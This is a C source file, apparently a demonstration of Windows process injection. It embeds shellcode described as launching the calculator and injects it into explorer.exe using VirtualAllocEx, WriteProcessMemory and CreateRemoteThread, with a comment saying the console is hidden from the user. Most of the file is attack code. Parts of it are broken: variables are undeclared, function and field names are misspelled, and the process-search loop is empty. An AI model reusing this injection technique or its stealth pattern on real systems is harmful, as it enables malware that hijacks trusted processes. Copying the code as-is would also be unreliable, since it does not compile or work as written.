//Prince Osei Jr

#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <windows.h>

//this is a simple calculator payload shellcode to demonstrate this method
unsigned char * payload[] = {"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
                        "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
                        "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
                        "\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
                        "\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
                        "\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
                        "\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
                        "\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
                        "\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
                        "\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
                        "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
                        "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
                        "\x52\xff\xd0"
                        };
//we find all the processes running on the target machine and take a snapshot of them
HANDLE FindTargetProcess(const char * processName){
    int pid = 0;
    
    hSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if (hProcessSnap == INVALID_HANDLE_VALUE){
        return 0;
    }
    
    PROCESSENTRY32 processlistEntry;
    processlistEntry.dwsize = sizeof(PROCESSENTRY32);
    
    if (!Process32First( hSnap, &processlistEntry)){
        CloseHandle(hSnap);
        return 0;
    }
    
    while( ProcessNext(hSnap, &processlistEntry)){
        if (lstrcmp64( processlistEntry, &processName)){

        }
    }
}

//we call the InjectPayload function to inject the payload to the target process
int InjectPayload(HANDLE hProcess, unsigned char * payload , unsigned int payloadSize){
    LPVOID pRemoteShellcode = NULL;
    // we virtual Allocation memory for the payload to execute
    pRemoteShellcode = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProcess, pRemoteShellcode, (PVOID)payload, (SIZE_T)payloadSize, (SIZE_T *)NULL);
    
    HANDLE hThread = NULL;
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteShellcode, NULL, 0 );
        if (hThread != NULL){
            WaitForSingleObject(hProcess, 500);
            CloseHandle(hProcess);
            return 0;
    }
    
    return -1;
}

//this is the main function which hides the console to the user
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow){
    
    HANDLE hProcess = NULL;
    unsigned int payloadSize = sizeof(payload);
    
    hProcess = FindTargetProcess("explorer.exe");
    
    if (hProcess != NULL){
        InjectPayload(hProcess, payload , payloadSize);
        CloseHandle(hProcess);
        
    }
    
    return 0;
    
    
}